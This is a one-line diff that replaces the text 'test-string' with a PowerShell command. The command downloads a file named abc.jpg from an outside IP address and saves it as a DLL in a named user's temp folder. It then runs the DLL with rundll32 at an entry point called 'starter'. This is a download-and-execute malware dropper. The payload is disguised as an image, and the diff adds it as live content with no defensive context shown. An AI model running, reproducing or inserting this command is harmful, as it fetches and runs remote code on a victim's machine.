@@ -1,1 +1,1 @@
-test-string
+powershell (new-object system.net.webclient).downloadfile("https://192.169.92.144/abc.jpg","c:\users\mariaa~1.huw\appdata\local\temp\huwc-wk-00970_mariaaguiar.huwc_nfknh.dll"); start-process rundll32.exe c:\users\mariaa~1.huw\appdata\local\temp\huwc-wk-00970_mariaaguiar.huwc_nfknh.dll,starter
